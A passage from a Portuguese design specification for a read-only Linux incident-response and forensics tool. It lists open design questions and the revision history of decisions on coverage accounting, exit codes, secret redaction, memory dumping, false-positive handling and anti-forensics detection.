`--sample-duration` da §2.7  quanto tempo por padrão? Amostragem de beacon custa tempo real
reimplementar dpkg -V?       os arquivos md5sums são texto simples — viável, e tiraria uma
                             dependência de binário do host. rpm não compensa
formato do baseline          JSON versionado, com migração entre versões da ferramenta
schema do facts.json         mesmo problema, e mais frequente: binário 0.4 lendo facts.json
                             gerado pelo 0.2, durante incidente, com a VM já destruída.
                             Precisa de `schema_version` e política de compatibilidade
--history                    quantas execuções manter, e o que fazer se o formato mudar
```

---

## 17. Histórico

### 0.2 → 0.3 — segunda revisão

```
definição     denominador da cobertura      → é o conjunto SELECIONADO, não o catálogo.
              indefinido: wtf e --only         wtf = 11/11, --only proc = 12/12. Sem isso os
              sairiam sempre INCOMPLETE        dois nunca sairiam 0 (7.7, 6.1)
contradição   gcore violava "sem execução    → dump de memória NATIVO já no v1 (~100 linhas,
              do host" (seção 10)              não ~400): ler /proc/pid/mem não faz attach,
                                               logo não seta TracerPid nem para o processo —
                                               é MENOS intrusivo que o gcore que estávamos
                                               indicando. ELF core fica fora de escopo (6.3)
lacuna        analyze cobre menos que scan  → CapFilesystem: checks que caminham disco viram
              e isso não estava dito          NOT_CHECKED em analyze (5.5, 6)
removido      --strict era redundante       → o default já falha em cobertura incompleta
definido      AutoWithManualFallback        → roda automático; quando NÃO consegue concluir,
              declarado e nunca explicado     emite MANUAL em vez de NOT_CHECKED (5.2)
definido      --history sem semântica       → marca novo/persiste/RESOLVIDO; reaparecimento
                                              eleva severidade (§22)
separado      Group misturava dois eixos    → --only = subsistema; --mode = auto|manual;
              (`manual` não é subsistema)     --checklist é atalho de apresentação (6)
definido      readiness/diff/watch/collect/ → tabela de exit code por subcomando (7.7)
              preserve sem exit code
redação       "41/47 · 4 · 2" não fechava   → completos + parciais + não verificados = total,
                                              e parcial conta como NÃO completo (7.7)
mapa          §5.9 e §33 ausentes           → entram como `—` conceitual, com motivo
aberto        schema do facts.json          → precisa de schema_version e política de
                                              compatibilidade (16)
```

### 0.1 → 0.2 — primeira revisão

```
contradição   collect violava o read-only  → preservação virou o subcomando `preserve` (6.2)
contradição   facts.json carregava segredo → política de redação (5.4)
contradição   cobertura não afetava exit   → RESULT: INCOMPLETE e exit 1 (7.5)
lacuna        systemd via systemctl        → coletor baseado em ARQUIVO, requisito do --root
lacuna        N achados do mesmo check     → uma finding por instância, com Subject (5.2)
lacuna        §22 sem estado               → --history
lacuna        fuso não declarado           → UTC sempre + estado do relógio no cabeçalho (7)
lacuna        Requires binário demais      → Optional + Result.Partial (5.2)
lacuna        correlação sem lugar         → correlate.go, §ref é o da conclusão (5.7)
menor         Origin struct x string       → Origin string
menor         --json inconsistente         → path ou "-"
menor         --only sem taxonomia         → grupos definidos (6)
menor         readiness x scan duplicados  → mesmo probe, renderização diferente (5.1)
nova seção    dependências não tratadas    → seção 11: política, sem Cobra, eBPF nativo,
                                             netlink adiado, tudo vendorizado
novo comando  faltava overview rápido      → `wtf` (6.1): ~1s, orçamento rígido, uma tela,
                                             e --oneline para triagem de FROTA
saída         formatos descritos, nunca    → 7.2 default compacto (~18 linhas, agrupa
              desenhados                          por ID) · 7.3 o -v · 7.4 JSONL com linha
                                             de cobertura · 7.5 rebaixamento por
                                             origin:tool · 7.6 o que a CLI NÃO entrega
verbosidade   default era o formato longo   → default vira COMPACTO; o longo vira -v (7.1).
              (200+ linhas num incidente      JSONL nunca é afetado por verbosidade.
              real)                           load passa a vir com nº de CPUs
convenção     § ambíguo entre runbook      → §N é SEMPRE runbook; referência interna
              e spec                         escrita sem o símbolo (cabeçalho)
feature       sem como alimentar IOC — a    → `--ioc` (6.4): IPs, hashes, paths, strings,
              §23 não era coberta de fato      chaves DESTE incidente. Achado por IOC é
                                               CRITICAL. Não é feed de fornecedor
feature       §9 sem âncora na 1ª execução   → `--since` transversal (6.5), e regra de default
              (ovo-e-galinha)                  explícita: deriva, ou usa 7 dias E DIZ que usou
correção      redação só protegia o          → é da camada de SAÍDA: relatório, JSONL e
              facts.json                       checklist também (5.4). O relatório vai p/ ticket
nova família  anti-forense estava diluída    → grupo próprio (5.7): wtmp com salto, log zerado,
              em notas de outras seções        HISTFILE off, chattr +a, timestomp
feature       catálogo só existia no código  → `aletheia checks` (7.6): id, §ref, modo, requires
feature       o war log dependia do humano   → a ferramenta imprime a própria linha, com
                                               caminho e hash (7.7)
feature       nenhum registro de QUAL         → run log em $IR/aletheia-runs.jsonl (7.7):
              execução produziu um achado      execução, binário, cobertura e cadeia de
                                               custódia do preserve. Só com --out/--history.
                                               NÃO é o war log: esse é humano e mora FORA
                                               do host (§39.2)
correção      SETE checks tinham classe de   → pivô exigia DIREÇÃO (proxy = entrada externa;
              falso positivo não tratada;      pivô = SAÍDA externa) · fd 0,1,2 descarta
              o pivô estava errado             socket activation · listener do PID 1 é o caso
                                               NORMAL (anomalia é sem .socket unit) ·
                                               ip_forward=1 é padrão com Docker · CapEff
                                               compara com o esperado · tainted só bit 13 sem
                                               DKMS · unit é SOMBREAMENTO, não local em /etc
modelo        nada obrigava declarar FP      → campo `FalsePositives` obrigatório (5.2),
                                               impresso no -v, no catálogo e junto do achado
regra         "estrutural" prometia FP zero  → 5.7 reescrita: estrutural = FP ENUMERÁVEL.
                                               Todo check passa por 2 testes: dispara com
                                               socket activation? dispara com containers?
nova seção    critério de decisão não       → 5.7: os CINCO mecanismos (estrutural,
              estava em lugar nenhum          correlação, divergência, referência externa,
                                              heurística) e o mapeamento para severidade
novo comando  §2.7 exigia amostragem que     → `watch --duration` (6.2): tempo limitado,
              o scan one-shot não faz          NÃO daemon. Cobre beacon e processo efêmero
novo modo     tcpdump ausente em imagem      → `preserve --pcap` (6.3): AF_PACKET nativo,
              mínima; instalar é pior          sem libpcap (cgo), com o aviso da §35.4
dependência   filtro BPF encodado à mão é    → aceita `golang.org/x/net/bpf` (11.4), segunda
              fonte de bug silencioso          exceção. Socket e escritor de pcap ficam
                                               nativos; drop de pacote é REPORTADO
rejeitado     kill/block/drop_caches         → kill/block: camada errada (§18 rebaixa o
                                              iptables do host) e quebra a garantia read-only.
                                              drop_caches DESTRÓI evidência (§3.16).
                                              Alternativa futura: `plan --contain`, que GERA
                                              o script ordenado da §19 sem executar
```
